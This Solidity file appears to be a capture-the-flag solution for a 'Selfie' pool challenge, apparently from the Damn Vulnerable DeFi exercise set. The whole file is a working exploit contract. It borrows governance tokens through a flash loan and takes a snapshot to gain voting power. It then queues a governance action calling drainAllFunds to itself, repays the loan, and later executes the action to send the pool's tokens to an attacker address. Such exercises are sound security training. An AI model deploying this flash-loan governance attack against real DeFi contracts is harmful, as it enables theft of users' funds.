// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

import "./SelfiePool.sol";
import "hardhat/console.sol";

/**
 * @title SelfiePoolAttack
 * @author Luciana Silva
 */
contract SelfiePoolAttack {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    uint256 public actionId;

    constructor(address _poolAddr, address _governanceAdd) {
        selfiePool = SelfiePool(_poolAddr);
        simpleGovernance = SimpleGovernance(_governanceAdd);
    }

    function receiveTokens(address token, uint256 borrowAmount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        console.log(
            "How much I want to transfer: ",
            ERC20Snapshot(token).balanceOf(address(this))
        );

        DamnValuableTokenSnapshot(token).snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);

        ERC20Snapshot(token).transfer(msg.sender, borrowAmount);
    }

    function attack(uint256 borrowAmount) external {
        selfiePool.flashLoan(borrowAmount);
    }

    function drainAll(
        uint256 borrowAmount,
        address token,
        address attacker
    ) external {
        simpleGovernance.executeAction{value: address(this).balance}(actionId);

        ERC20Snapshot(token).transfer(attacker, borrowAmount);
    }

    receive() external payable {}
}
